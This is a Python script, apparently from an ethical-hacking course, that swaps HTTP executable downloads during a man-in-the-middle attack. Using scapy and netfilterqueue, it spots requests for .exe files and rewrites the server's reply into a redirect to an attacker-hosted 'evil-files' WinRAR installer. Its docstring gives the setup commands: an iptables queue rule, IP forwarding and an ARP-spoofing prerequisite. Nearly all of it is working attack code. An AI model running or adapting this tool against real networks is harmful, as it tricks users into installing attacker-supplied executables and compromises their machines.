#!/usr/bin/env python

'''
Linux tool that replaces the downloaded file during MITM attack. Works with HTTP protocol only.
Credits to "Learn Python and Ethical Hacking from Scratch" course by Zaid Sabih.

In order to work you need to poison ARP cache of the target (running arp_spoof.py) and set the packages to queue as follows (assuming you are MITM and sniffing target packets):
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

Also make sure that your machine is forwarding packages:
sudo sysctl net.ipv4.ip_forward=1

Remember to flush iptables after the attack:
sudo iptables --flush

Evgeni Semenov, hello@safemail.sbs

Should work on python3
'''

import netfilterqueue #queue handling
import scapy.all as scapy #packet manipulation library

ack_list = [] #empty list ack
def set_load(packet, load): # function that replaces the load of the packet
    packet[scapy.Raw].load = load
    # removing the cheksums (scapy will re-calculate them):
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #converting packet to scapy packet
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet: # checking if the packet has a Raw layer
        if scapy_packet[scapy.TCP].dport == 80: # checking whether the packet is a HTTP request
            if ".exe" in str(scapy_packet[scapy.Raw].load): # checking whether there is an .exe file in the Raw field (=user tries to download the file)
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack) # storing ack number in the list

        elif scapy_packet[scapy.TCP].sport == 80: # checking whether the packet is a HTTP response
            if scapy_packet[scapy.TCP].seq in ack_list: #checking whether sequence of response is in the ack_list
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/evil-files/winrar-x64-611fi.exe\n\n")

                packet.set_payload(bytes(modified_packet))

    packet.accept()

if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet) #number of queue is the same as you set in iptables --queue-num
    queue.run()
